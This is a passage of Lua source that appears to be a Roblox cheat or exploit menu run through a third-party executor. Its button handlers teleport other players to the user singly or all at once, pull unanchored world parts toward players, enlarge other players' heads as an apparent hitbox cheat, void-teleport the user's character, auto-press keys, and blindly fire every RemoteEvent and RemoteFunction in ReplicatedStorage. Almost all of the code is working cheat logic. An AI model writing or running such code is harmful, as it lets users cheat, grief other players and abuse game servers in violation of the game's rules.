  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    bem.Visible = true
    nem.Visible = false
    bem2.Visible = false
    nem2.Visible = true
    mypages.Text = "Page 2"
    oppage.Visible = false
end)

toggleState = false
jksettings = "jksettings/IntroSet.txt"
logVisibleFile = "jksettings/LogVisible.txt"

function updateButtonVisual()
    local targetPosition
    local targetColor

    if toggleState then
        targetPosition = UDim2.new(0.75, 0, 0.5, 0)
        targetColor = Color3.fromRGB(0, 255, 0)
        settingf1.BorderColor3 = Color3.new(0, 1, 0)
    else
        targetPosition = UDim2.new(0.25, 0, 0.5, 0)
        targetColor = Color3.fromRGB(255, 0, 0)
        settingf1.BorderColor3 = Color3.new(1, 0, 0)
    end

    local tweenInfo = TweenInfo.new(
        0.2,
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.Out
    )
    local positionTween = TweenService:Create(setf1b, tweenInfo, {Position = targetPosition})
    local colorTween = TweenService:Create(setf1b, tweenInfo, {BackgroundColor3 = targetColor})
    positionTween:Play()
    colorTween:Play()
end

function isToggleOnVisually()
    return setf1b.Position.X.Offset > (settingf1.Size.X.Offset / 2)
end

settingf1.MouseButton1Click:Connect(function()
    toggleState = not toggleState
    updateButtonVisual()
    if toggleState then
        writefile(jksettings, "iskip = true, toggleState = true")
    else
        writefile(jksettings, "iskip = false, toggleState = false")
    end

    if isfile(jksettings) then
        print("Updated " .. jksettings)
    end
end)

if isfile(jksettings) then
    fileContent = readfile(jksettings)
    if fileContent then
        iskipValue = fileContent:match("iskip = (%w+)")
        if iskipValue == "true" then
            toggleState = true
            updateButtonVisual()
            print("Loaded state from " .. jksettings .. ": iskip = true")
        elseif iskipValue == "false" then
            toggleState = false
            updateButtonVisual()
            print("Loaded state from " .. jksettings .. ": iskip = false")
        end
    end
else
        print(jksettings .. " not found.")
end

if isToggleOnVisually() then
    print("Warning: Toggle is visually ON, but file/state may disagree.")
end

logVisibleState = false
imgIsVisible = true

function updateLogVisibleButton()
    local targetPosition
    local targetColor
    if logVisibleState then
        targetPosition = UDim2.new(0.75, 0, 0.5, 0)
        targetColor = Color3.fromRGB(0, 255, 0)
        settingf2.BorderColor3 = Color3.new(0, 1, 0)
    else
        targetPosition = UDim2.new(0.25, 0, 0.5, 0)
        targetColor = Color3.fromRGB(255, 0, 0)
        settingf2.BorderColor3 = Color3.new(1, 0, 0)
    end

    local tweenInfo = TweenInfo.new(
        0.2,
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.Out
    )
    local positionTween = TweenService:Create(setf2b, tweenInfo, {Position = targetPosition})
    local colorTween = TweenService:Create(setf2b, tweenInfo, {BackgroundColor3 = targetColor})
    positionTween:Play()
    colorTween:Play()

    if ckTeam then ckTeam.Visible = not logVisibleState end
    if backinamage then backinamage.Visible = not logVisibleState end
    if orbitzxc then orbitzxc.Visible = not logVisibleState end
    if sigmb then sigmb.Visible = not logVisibleState end

    writefile(logVisibleFile, "imgIsVisible = " .. tostring(not logVisibleState))
end

settingf2.MouseButton1Click:Connect(function()
    logVisibleState = not logVisibleState
    updateLogVisibleButton()

    if isfile(logVisibleFile) then
        print("Updated " .. logVisibleFile)
    end
end)

if isfile(logVisibleFile) then
    fileContent = readfile(logVisibleFile)
    if fileContent then
        imgIsVisibleValue = fileContent:match("imgIsVisible = (%w+)")
        if imgIsVisibleValue == "true" then
            logVisibleState = false
        elseif imgIsVisibleValue == "false" then
            logVisibleState = true
        end
        updateLogVisibleButton()
        print("Loaded state " .. logVisibleFile .. ": imgIsVisible = " .. imgIsVisibleValue)
    end
else
    print(logVisibleFile .. " not found.")
end

local fl = false 
function VisibleVis()
    local targetPosition
    local targetColor

    if fl then
        targetPosition = UDim2.new(0.75, 0, 0.5, 0)
        targetColor = Color3.fromRGB(0, 255, 0)
        settingf5.BorderColor3 = Color3.new(0, 1, 0)
    else
        targetPosition = UDim2.new(0.25, 0, 0.5, 0)
        targetColor = Color3.fromRGB(255, 0, 0)
        settingf5.BorderColor3 = Color3.new(1, 0, 0)
    end

    local tweenInfo = TweenInfo.new(
        0.2,
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.Out
    )

    local positionTween = TweenService:Create(setf5b, tweenInfo, {Position = targetPosition})
    local colorTween = TweenService:Create(setf5b, tweenInfo, {BackgroundColor3 = targetColor})

    positionTween:Play()
    colorTween:Play()
end

settingf5.MouseButton1Click:Connect(function()
    fl = not fl 
    openui.Visible = not openui.Visible 
    VisibleVis() 
	notif({
		Text = "Toggle Button Visible will not saved to prevent user lose the mainFrame",
		Duration = 6,
		topm = "Warning!"
	})
end)

isEffectActive = false
unanchoredparts = {} 
movers = {}         

ocn30.MouseButton1Click:Connect(function()
    if not isEffectActive then
        isEffectActive = true
        ocn30.Text = "Stop Follow"

        unanchoredparts = {}
        movers = {}

        for index, part in pairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(LocalPlayer.Character) == false then
                table.insert(unanchoredparts, part)
                part.Massless = true
                part.CanCollide = false
                if part:FindFirstChildOfClass("BodyPosition") then
                    part:FindFirstChildOfClass("BodyPosition"):Destroy()
                end
            end
        end

        for index, part in pairs(unanchoredparts) do
            local mover = Instance.new("BodyPosition", part)
            table.insert(movers, mover)
            mover.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        end

        task.spawn(function()
            while isEffectActive and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character:FindFirstChild("Humanoid").Health > 0 do
                 local rootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                 if rootPart then
                     for i = #movers, 1, -1 do 
                         local mover = movers[i]
                         if mover and mover.Parent and mover.Parent:IsA("BasePart") then
                             mover.Position = rootPart.CFrame:PointToWorldSpace(Vector3.new(0, 0, 5))
                         else
                             if mover and mover.Parent then 
                                 mover:Destroy()
                             end
                             table.remove(movers, i)
                         end
                     end
                 end
                 if #movers == 0 then
                     isEffectActive = false
                     ocn30.Text = "Follow Unachored Parts" 
                     break
                 end
                wait(0.05)
            end

            for _, mover in pairs(movers) do
                if mover and mover.Parent then
                    mover:Destroy()
                end
            end
            unanchoredparts = {}
            movers = {}
            if ocn30.Text ~= "Follow Unachored Parts" then
                 ocn30.Text = "Follow Unachored Parts"
            end
            isEffectActive = false
        end)

    else
        isEffectActive = false 
        ocn30.Text = "Start Follow"

        for _, mover in pairs(movers) do
            if mover and mover.Parent then
                mover:Destroy()
            end
        end
        unanchoredparts = {}
        movers = {}
    end
end)

function grabAllTools(player)
	character = player.Character
	if not character or not character:FindFirstChildWhichIsA("Humanoid") then
		return 
	end
	humanoid = character:FindFirstChildWhichIsA("Humanoid")

	for _, child in ipairs(workspace:GetChildren()) do
		if child:IsA("Tool") then 
			humanoid:EquipTool(child)
		end
	end
end

oc13.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	if player then
		grabAllTools(player)
	else
		warn("LocalPlayer not found when Grab All Tools button was clicked.")
	end
end)


 function getRoot(character)
	if character and character:FindFirstChild("HumanoidRootPart") then
		return character.HumanoidRootPart
	end
	return nil
end


oc17.MouseButton1Click:Connect(function()
	 partNameToFind = oc18.Text
	 character = localPlayer and localPlayer.Character

	if not character then
		warn("Local player's character not found.")
		return
	end

	 rootPart = getRoot(character)
	if not rootPart then
		warn("HumanoidRootPart not found in your character.")
		return
	end

	 foundPart = nil
	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BasePart") and descendant.Name:lower() == partNameToFind:lower() then
			foundPart = descendant
			break 
		end
	end

	if foundPart then
		foundPart.CFrame = rootPart.CFrame
		print("Brought part:", foundPart.Name)
	else
		warn("Part with the name '" .. partNameToFind .. "' not found in the workspace.")
	end
end)


oc16.MouseButton1Click:Connect(function()
	 partNameToFind = oc18.Text
	 character = localPlayer and localPlayer.Character

	if not character then
		warn("Local player's character not found.")
		return
	end

	 matchingParts = {}
	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BasePart") and descendant.Name:lower() == partNameToFind:lower() then
			table.insert(matchingParts, descendant)
		end
	end

	if #matchingParts > 0 then
		 randomIndex = math.random(1, #matchingParts)
		 targetPart = matchingParts[randomIndex]
		 humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		 humanoid = character:FindFirstChild("Humanoid")

		if humanoidRootPart and humanoid then
			humanoidRootPart.CFrame = targetPart.CFrame
			if humanoid.Health <= 0 then
				humanoid.Health = 100
			end
			print("Teleported to a random part named:", targetPart.Name)
		end
	else
		warn("No part found with the name '" .. partNameToFind .. "'.")
	end
end)

originalPosition = nil
isTeleported = false


function teleportPlayer()
    player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        if not isTeleported then
            
            originalPosition = player.Character.HumanoidRootPart.CFrame
            targetPosition = Vector3.new(0, -99999999999, 0)
            player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            
            oc24.Text = "UnVoid" 
            isTeleported = true
        else
            
            if originalPosition then
                player.Character.HumanoidRootPart.CFrame = originalPosition
                
                oc24.Text = "Void" 
                isTeleported = false
            else
                print("position not stored.")
            end
        end
    else
        print("not found.")
    end
end


oc24.MouseButton1Click:Connect(teleportPlayer)

bringPlayerActive = false
targetPlayerToBring = nil 
bringAllPlayers = false 

function getRoot(character)
    if character then
        return character:FindFirstChild("HumanoidRootPart")
    end
    return nil
end

function isNumber(value)
    return typeof(value) == "number"
end

oc19.MouseButton1Click:Connect(function()
	local targetUsername = oc22.Text 
	local localPlayer = Players.LocalPlayer

	if not localPlayer then
		warn("Local player not found.")
		return
	end

	if bringPlayerActive then

		bringPlayerActive = false 
		targetPlayerToBring = nil 
		bringAllPlayers = false 

		task.wait(0.1)

		oc19.Text = "Bring player"
		
		return
	end

	local lowerInput = string.lower(targetUsername or "") 

    if lowerInput == "" or lowerInput == "player name" or lowerInput == "username" then
        warn("Please enter a valid player name or 'All' to bring.")
        return
    end

	if lowerInput == "all" then
		bringAllPlayers = true 
		bringPlayerActive = true 
		targetPlayerToBring = nil 

		oc19.Text = "Stop Bring All"
		
	else
		
		bringAllPlayers = false 
		local target = nil 

		for _, player in Players:GetPlayers() do
			local lowerPlayerName = string.lower(player.Name)
			local lowerDisplayName = string.lower(player.DisplayName)
			if string.find(lowerPlayerName, lowerInput, 1, true) or string.find(lowerDisplayName, lowerInput, 1, true) then 
				target = player
				break 
			end
		end

		if target and target ~= localPlayer then
			
			targetPlayerToBring = target 
			bringPlayerActive = true 
            bringAllPlayers = false 
			oc19.Text = "Stop Bring"
			print("target.Name")
		elseif target == localPlayer then
			warn("Cannot bring yourself.")
            return
		else
			warn("Player matching '" .. targetUsername .. "' not found.")
            return
		end
	end
end)


RunService.Heartbeat:Connect(function()
	if bringPlayerActive then
        local localPlayerCheck = Players:FindFirstChild(Players.LocalPlayer.Name) 

        if not localPlayerCheck or not localPlayerCheck.Character or not getRoot(localPlayerCheck.Character) then
            
            warn("Local player or character missing, stopping bring.")
            bringPlayerActive = false
            targetPlayerToBring = nil
            bringAllPlayers = false
            
            if oc19 and oc19.Text ~= "Bring player" then oc19.Text = "Bring player" end
            return 
        end

        local localRootPart = getRoot(localPlayerCheck.Character)
        local targetPosition = localRootPart.Position 

		if bringAllPlayers then
			for _, targetPlayerCheck in Players:GetPlayers() do
                
				if targetPlayerCheck ~= localPlayerCheck and targetPlayerCheck.Character and getRoot(targetPlayerCheck.Character) then
					local targetRootPart = getRoot(targetPlayerCheck.Character)

                    
                    targetRootPart.CFrame = CFrame.new(targetPosition)

                    
				end
			end
		elseif targetPlayerToBring then
			
            local targetPlayerCheck = Players:FindFirstChild(targetPlayerToBring.Name)
            if targetPlayerCheck and targetPlayerCheck.Character and getRoot(targetPlayerCheck.Character) then
                local targetRootPart = getRoot(targetPlayerCheck.Character)

                
                local bringOffset = localRootPart.CFrame.LookVector * 3
                local bringPosition = localRootPart.CFrame.Position + bringOffset
                local bringCFrame = CFrame.lookAt(bringPosition, localRootPart.CFrame.Position) 
                
                targetRootPart.CFrame = bringCFrame

                
            else
                
                warn("Specific target player missing, stopping bring.")
                bringPlayerActive = false 
                targetPlayerToBring = nil 
                bringAllPlayers = false 

                
                if oc19 and oc19.Text ~= "Bring player" then oc19.Text = "Bring player" end
            end
		end
	end
end)

 function safeTouchFunction(args, speaker)
	if not speaker or not speaker.Character then
		warn("Invalid")
		return
	end

	 root = speaker.Character:FindFirstChild("HumanoidRootPart") or speaker.Character:FindFirstChildWhichIsA("BasePart")
	if not root then
		warn("not find root part.")
		return
	end

	 function movePart(part)
		if part:IsA("BasePart") then
			part.CFrame = root.CFrame
		end
	end

	if args and #args > 0 and typeof(args[1]) == "string" then
		 name = args[1]
		for _, descendant in ipairs(workspace:GetDescendants()) do
			if descendant:IsA("TouchTransmitter") and descendant.Name == name or (descendant.Parent and descendant.Parent.Name == name) then
				 partToMove = descendant:FindFirstAncestorWhichIsA("Part")
				if partToMove then
					movePart(partToMove)
					print("TouchTransmitter:", descendant.Name)
				end
			end
		end
	else
		for _, descendant in ipairs(workspace:GetDescendants()) do
			if descendant:IsA("TouchTransmitter") then
				 partToMove = descendant:FindFirstAncestorWhichIsA("Part")
				if partToMove then
					movePart(partToMove)
					print("TouchTransmitter:", descendant.Name)
				end
			end
		end
	end
end

oc15.MouseButton1Click:Connect(function()
	safeTouchFunction({"SpecialButton"}, localPlayer) 
end)

oc14.MouseButton1Click:Connect(function()
 	safeTouchFunction({}, localPlayer)
 end)
 
  autoKeyPressing = false
 cancelAutoKeyPress = nil
 currentKey = "q" 

keycodeMap = {
	["0"] = 0x30,
	["1"] = 0x31,
	["2"] = 0x32,
	["3"] = 0x33,
	["4"] = 0x34,
	["5"] = 0x35,
	["6"] = 0x36,
	["7"] = 0x37,
	["8"] = 0x38,
	["9"] = 0x39,
	["a"] = 0x41,
	["b"] = 0x42,
	["c"] = 0x43,
	["d"] = 0x44,
	["e"] = 0x45,
	["f"] = 0x46,
	["g"] = 0x47,
	["h"] = 0x48,
	["i"] = 0x49,
	["j"] = 0x4A,
	["k"] = 0x4B,
	["l"] = 0x4C,
	["m"] = 0x4D,
	["n"] = 0x4E,
	["o"] = 0x4F,
	["p"] = 0x50,
	["q"] = 0x51,
	["r"] = 0x52,
	["s"] = 0x53,
	["t"] = 0x54,
	["u"] = 0x55,
	["v"] = 0x56,
	["w"] = 0x57,
	["x"] = 0x58,
	["y"] = 0x59,
	["z"] = 0x5A,
	["enter"] = 0x0D,
	["shift"] = 0x10,
	["ctrl"] = 0x11,
	["alt"] = 0x12,
	["pause"] = 0x13,
	["capslock"] = 0x14,
	["spacebar"] = 0x20,
	["space"] = 0x20,
	["pageup"] = 0x21,
	["pagedown"] = 0x22,
	["end"] = 0x23,
	["home"] = 0x24,
	["left"] = 0x25,
	["up"] = 0x26,
	["right"] = 0x27,
	["down"] = 0x28,
	["insert"] = 0x2D,
	["delete"] = 0x2E,
	["f1"] = 0x70,
	["f2"] = 0x71,
	["f3"] = 0x72,
	["f4"] = 0x73,
	["f5"] = 0x74,
	["f6"] = 0x75,
	["f7"] = 0x76,
	["f8"] = 0x77,
	["f9"] = 0x78,
	["f10"] = 0x79,
	["f11"] = 0x7A,
	["f12"] = 0x7B,
}

oc2.MouseButton1Click:Connect(function()
	if keypress and keyrelease and kb then 
		 text = kb.Text:lower()
		 code = keycodeMap[text]

		if not code then
			print("Invalid key")
			return
		end

		currentKey = text
		autoKeyPressing = not autoKeyPressing
		oc2.Text = autoKeyPressing and "Stop Key" or "Auto Key"

		if autoKeyPressing then
			 clickDelay = 0.1
			 releaseDelay = 0.1

			cancelAutoKeyPress = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent and input.KeyCode == Enum.KeyCode[currentKey:upper()] then
					autoKeyPressing = false
					oc2.Text = "Auto Key"
					if cancelAutoKeyPress then
						cancelAutoKeyPress:Disconnect()
						cancelAutoKeyPress = nil
						if keyrelease then keyrelease(code) end
					end
					print("toggled OFF")
				end
			end)

			print("toggled ON'" .. currentKey .. "'. Press '" .. currentKey:upper() .. "' again to toggle OFF.")
			spawn(function()
				while autoKeyPressing do
					if keypress then keypress(code) end
					wait(clickDelay)
					if keyrelease then keyrelease(code) end
					wait(releaseDelay)
				end
				if cancelAutoKeyPress then
					cancelAutoKeyPress:Disconnect()
					cancelAutoKeyPress = nil
					if keyrelease then keyrelease(code) end
				end
				print("key toggled OFF.")
				oc2.Text = "Auto Key"
			end)
		else
			if cancelAutoKeyPress then
				cancelAutoKeyPress:Disconnect()
				cancelAutoKeyPress = nil
				 code = keycodeMap[currentKey] 
				if keyrelease and code then keyrelease(code) end
			end
			print("key toggled OFF.")
		end
	else
		print("Missing key press/release capabilities or TextBox reference.")
	end
end)

 camera = workspace.CurrentCamera

 isCameraFocused = false
 focusedSubject = nil

oc20.MouseButton1Click:Connect(function()
playerName = oc22.Text
    if not playerName or playerName == "" or playerName == "Player Name" or playerName == "Username" then
        warn("Please enter a valid player name.")
        return 
    end

    local targetPlayer = nil
    local lowerInput = string.lower(playerName)

    
    for _, player in Players:GetPlayers() do
        local lowerPlayerName = string.lower(player.Name)
        local lowerDisplayName = string.lower(player.DisplayName)
        if string.find(lowerPlayerName, lowerInput, 1, true) or string.find(lowerDisplayName, lowerInput, 1, true) then 
            targetPlayer = player
            break
        end
    end

    
    if targetPlayer then
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
            if isCameraFocused and focusedSubject == targetPlayer.Character.Head then
                camera.CameraSubject = Players.LocalPlayer.Character:FindFirstChild("Head") or camera.CameraSubject
                isCameraFocused = false
                focusedSubject = nil
                oc20.Text = "View player"
            else
                camera.CameraSubject = targetPlayer.Character.Head
                isCameraFocused = true
                focusedSubject = targetPlayer.Character.Head
                oc20.Text = "Unview player"
            end
        else
            warn("Player '" .. targetPlayer.Name .. "' found, but character not loaded.")
        end
    else
        warn("Player matching '" .. playerName .. "' not found.")
    end
end)

 isBringingParts = false
 currentMoverParts = {}
oc21.MouseButton1Click:Connect(function()
	 playerName = oc22.Text
	if not playerName or playerName == "" then
		warn("Please enter a player name.")
		return
	end
	 targetPlayer = nil
	for _, player in Players:GetPlayers() do
		 lowerPlayerName = string.lower(player.Name)
		 lowerDisplayName = string.lower(player.DisplayName)
		 lowerInput = string.lower(playerName)
		if string.find(lowerPlayerName, lowerInput) or string.find(lowerDisplayName, lowerInput) then
			targetPlayer = player
			break
		end
	end
	if targetPlayer then
		isBringingParts = not isBringingParts
		if isBringingParts then
			oc21.Text = "Turn OFF"
			if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
				warn("Invalid player specified or player has no HumanoidRootPart.")
				isBringingParts = false
				oc21.Text = "Tween Parts to Player"
				return
			end
			 hrp = targetPlayer.Character.Head
			for _, part in ipairs(Workspace:GetDescendants()) do
				if part:IsA("BasePart") and not part.Anchored and part ~= hrp and not part:IsDescendantOf(targetPlayer.Character) and not currentMoverParts[part] then
					 bodyPosition = Instance.new("BodyPosition")
					bodyPosition.Parent = part
					bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					bodyPosition.Position = hrp.Position
					bodyPosition.P = 19999
					bodyGyro = Instance.new("BodyGyro")
					bodyGyro.Parent = part
					bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
					bodyGyro.CFrame = hrp.CFrame
					bodyGyro.P = 19999
					currentMoverParts[part] = {
						BodyPosition = bodyPosition,
						BodyGyro = bodyGyro
					}
				end
			end
			print("targetPlayer.Name")
		else
			oc21.Text = "Tween Parts to Player"
			for part, movers in pairs(currentMoverParts) do
				if part and not part:IsDescendantOf(Workspace) then
					currentMoverParts[part] = nil
				else
					if movers.BodyPosition then
						movers.BodyPosition:Destroy()
					end
					if movers.BodyGyro then
						movers.BodyGyro:Destroy()
					end
					currentMoverParts[part] = nil
				end
			end
			table.clear(currentMoverParts)
			print("Stopped")
		end
	else
		warn("Player '" .. playerName .. "' not found.")
		isBringingParts = false
		oc21.Text = "Tween to Player"
		for part, movers in pairs(currentMoverParts) do
			if movers.BodyPosition then
				movers.BodyPosition:Destroy()
			end
			if movers.BodyGyro then
				movers.BodyGyro:Destroy()
			end
		end
		table.clear(currentMoverParts)
	end
end)
oc22.Focused:Connect(function()
	if oc22.Text == "Player Name" then
		oc22.Text = ""
	end
end)
oc22.FocusLost:Connect(function()
	if oc22.Text == "" then
		oc22.Text = "Player Name"
	end
end)


shownParts = {}
arePartsVisible = false

function showInvisibleParts()
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Transparency == 1 then
			if not table.find(shownParts, v) then
				table.insert(shownParts, v)
			end
			v.Transparency = 0
		end
	end
	ocn31.Text = "Visible Parts"
	arePartsVisible = true
end

function hideVisibleParts()
	for i, v in pairs(shownParts) do
		if v and v.Parent ~= nil then 
			v.Transparency = 1
		end
	end
	shownParts = {}
	ocn31.Text = "Show Invisible Parts"
	arePartsVisible = false
end

ocn31.MouseButton1Click:Connect(function()
	if not arePartsVisible then
		showInvisibleParts()
	else
		hideVisibleParts()
	end
end)


isFrozen = false

floatName = "" 


function freezeCharacter(character)
	if not character then return end
	task.spawn(function()
		for i, x in next, character:GetDescendants() do
			if x:IsA("BasePart") and not x.Anchored then
				x.Anchored = true
			end
		end
	end)
end

function thawCharacter(character)
	if not character then return end
	task.spawn(function()
		for i, x in next, character:GetDescendants() do
						if x:IsA("BasePart") and x.Anchored and (floatName == nil or floatName == "" or x.Name ~= floatName) then
				x.Anchored = false
			end
		end
	end)
end

ocn37.MouseButton1Click:Connect(function()
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 

	if not character then
		warn("Character not found for local player!")
		return
	end

	if isFrozen then
		thawCharacter(character)
		isFrozen = false
		ocn37.Text = "Freeze" 
	else
		freezeCharacter(character)
		isFrozen = true
		ocn37.Text = "Thaw" 
	end
end)

origp = nil
itp = false


function teleportPl()
    player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        if not itp then
            
            origp = player.Character.HumanoidRootPart.CFrame
            targetPosition = Vector3.new(9999999.00, 99999.00, 9999999.00)
            player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            
            ocn39.Text = "Return" 
            itp = true
        else
            
            if origp then
                player.Character.HumanoidRootPart.CFrame = origp
                
                ocn39.Text = "Glitching Position" 
                itp = false
            else
                print("position not stored.")
            end
        end
    else
        print("not found.")
    end
end

part = Instance.new("Part")
part.Position = Vector3.new(9999999.00, 99990.00, 9999999.00)
part.Size = Vector3.new(20, 0.2, 20)
part.Anchored = true 
part.Parent = game.Workspace 

ocn39.MouseButton1Click:Connect(teleportPl)

function runRemotes(parent)
    for _, child in ipairs(parent:GetDescendants()) do
        if child:IsA("RemoteEvent") then
            pcall(function() child:FireServer() end)
        elseif child:IsA("RemoteFunction") then
            pcall(function()
                local result = child:InvokeServer()
                print("Result from server:", result)
            end)
        end
    end
end

ocn40.MouseButton1Click:Connect(function()
wait(5)
runRemotes(ReplicatedStorage)
end)

teleportPositions = {
    Vector3.new(0, -99999999999, 0),
    Vector3.new(0, 0.09, 9999999.00),
    Vector3.new(9999999, 0.09, 0),
    Vector3.new(0, 9999999, 0),
    Vector3.new(9999999, 9999999, 9999999),
    Vector3.new(math.random(9000, 20000), math.random(1, 1000), math.random(10000, 100000)),
    Vector3.new(math.random(1000, 10000), math.random(1000, 10000), math.random(1000, 10000)),
    Vector3.new(9999, 9999, 9999),
    Vector3.new(0, 99999999, 0)
}

orgpps = nil
rt = false
tp = false

function teleportPlayer()
    local randomIndex = math.random(1, #teleportPositions)
    local randomPosition = teleportPositions[randomIndex]

    local character = localPlayer.Character
    if character and character.PrimaryPart then
        if rt and orgpps then
            character.PrimaryPart.CFrame = CFrame.new(orgpps)
            wait(1)
        end

        orgpps = character.PrimaryPart.CFrame.Position
        if tp then
            character.PrimaryPart.CFrame = CFrame.new(randomPosition)
        end
    else
        warn("Player character not found.")
    end
end

ocn41.MouseButton1Click:Connect(function()
    if not tp then
        tp = true
        rt = false
        ocn41.Text = "Return"
        teleportPlayer()
        local connection;
        connection = game:GetService("RunService").Heartbeat:Connect(function()
            if tp then
                teleportPlayer()
            else
                if connection then
                    connection:Disconnect()
                end
            end
        end)        
        
    else
        rt = true
        tp = false
        ocn41.Text = "Random Glitching Position"
        if localPlayer.Character then
            local humanoid = localPlayer.Character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end
end)

function getTargetPlayers(inputString)
    local foundPlayers = {}
    local lowerInput = string.lower(inputString)

    if lowerInput == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= localPlayer then
                table.insert(foundPlayers, player)
            end
        end
        return foundPlayers
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if player == localPlayer then continue end 

        local lowerPlayerName = string.lower(player.Name)
        local lowerDisplayName = string.lower(player.DisplayName)

        if string.find(lowerPlayerName, lowerInput, 1, true) or string.find(lowerDisplayName, lowerInput, 1, true) then
            table.insert(foundPlayers, player)
        end
    end

    return foundPlayers
end

function setHeadSize(player, sizeVector)
    if player and player.Character then
        local head = player.Character:FindFirstChild('Head')
        if head and head:IsA("BasePart") then
            head.Size = sizeVector
        end
    end
end

playerHeadStates = {}

ocn46.MouseButton1Click:Connect(function()
    local targetInput = ocn49.Text 
    local targetPlayers = getTargetPlayers(targetInput)

    if #targetPlayers == 0 then
        notif({
		Text = "No players found matching.",
		Duration = 5,
		topm = "Information!"
	})
        return 
    end

    local sizeFromTextBox = tonumber(ocn50.Text)
    if not sizeFromTextBox or sizeFromTextBox <= 0 then
       notif({
		Text = "Invalid head size.",
		Duration = 2,
		topm = "Warning!"
	})
        return 
    end

    local anyPlayerCurrentlyBig = false 

    for _, player in ipairs(targetPlayers) do
        local userId = player.UserId
        local playerState = playerHeadStates[userId] or {isToggled = false, originalSize = nil}

        if not playerState.isToggled then
            
            anyPlayerCurrentlyBig = true
            playerState.isToggled = true

            if player.Character and player.Character:FindFirstChild('Head') then
                playerState.originalSize = player.Character.Head.Size
            end
            setHeadSize(player, Vector3.new(sizeFromTextBox, sizeFromTextBox, sizeFromTextBox))
        else
            playerState.isToggled = false

            if playerState.originalSize then
                setHeadSize(player, playerState.originalSize)
            else
                
                setHeadSize(player, Vector3.new(2, 1, 1))
            end
            playerHeadStates[userId] = nil 
        end
        playerHeadStates[userId] = playerState 
    end

    if string.lower(targetInput) == "all" then
        if anyPlayerCurrentlyBig then
            ocn46.Text = "HeadSized"
        else
            ocn46.Text = "Set HeadSize Player"
        end
    end
end)

local function findTargetPlayer(inputName)
    local Players = game:GetService("Players")
    local foundPlayers = {}
    local addedPlayerIds = {}

    local lowerInputName = string.lower(inputName)

    for _, player in ipairs(Players:GetPlayers()) do
        local lowerPlayerName = string.lower(player.Name)
        local lowerDisplayName = string.lower(player.DisplayName)

        if addedPlayerIds[player.UserId] then
            continue
        end

        if lowerPlayerName == lowerInputName then
            table.insert(foundPlayers, player)
            addedPlayerIds[player.UserId] = true
        end

        if lowerDisplayName == lowerInputName and not addedPlayerIds[player.UserId] then
            table.insert(foundPlayers, player)
            addedPlayerIds[player.UserId] = true
        end

        if string.sub(lowerPlayerName, 1, #lowerInputName) == lowerInputName and not addedPlayerIds[player.UserId] then
            table.insert(foundPlayers, player)
            addedPlayerIds[player.UserId] = true
        end

        if string.sub(lowerDisplayName, 1, #lowerInputName) == lowerInputName and not addedPlayerIds[player.UserId] then
            table.insert(foundPlayers, player)
            addedPlayerIds[player.UserId] = true
        end
    end

    if #foundPlayers == 1 then
        return foundPlayers[1]
    elseif #foundPlayers > 1 then
        notif({
            Text = "Multiple players found for '" .. inputName .. "'. Please be more specific.",
            Duration = 5,
            topm = "Ambiguous Name!"
        })
        return nil
    else
        return nil
    end
end

ocn47.MouseButton1Click:Connect(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Character = LocalPlayer.Character
    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")

    if not HumanoidRootPart then
        notif({
            Text = "Your character is not found",
            Duration = 5,
            topm = "Error!"
        })
        return
    end

    local targetInput = ocn49.Text
    if #targetInput == 0 then
        notif({
            Text = "Please enter a player name or display name.",
            Duration = 5,
            topm = "Input Missing!"
        })
        return
    end

    local targetPlayer = findTargetPlayer(targetInput)

    if not targetPlayer then
        notif({
            Text = "Player '" .. targetInput .. "' not found. Check spelling or if they're in-game.",
            Duration = 5,
            topm = "Player Not Found!"
        })
        return
    end

    local targetCharacter = targetPlayer.Character
    local targetHumanoidRootPart = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")

    if not targetHumanoidRootPart then
        notif({
            Text = "Target player's character or body part not found.",
            Duration = 5,
            topm = "Target Error!"
        })
        return
    end

    local delayText = ocn50.Text
    local delayTime = tonumber(delayText)

    if not delayTime or delayTime < 0 then
        notif({
            Text = "Invalid Number.",
            Duration = 5,
            topm = "Invalid Input!"
        })
        delayTime = 0
    end

    local originalPosition = HumanoidRootPart.CFrame

    HumanoidRootPart.CFrame = targetHumanoidRootPart.CFrame * CFrame.new(1, 0, 1)

    task.wait(delayTime)

    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition
        notif({
            Text = "Teleport successful! Returned to original position.",
            Duration = 1,
            topm = "Success!"
        })
    else
        notif({
            Text = "Could not return to original position. Your character may have been reset.",
            Duration = 5,
            topm = "Return Failed!"
        })
end
end)

function runObungaEffect(player)
    if not player:IsA("Player") then
        warn("runObungaEffect was called with an invalid argument: " .. tostring(player))
        return
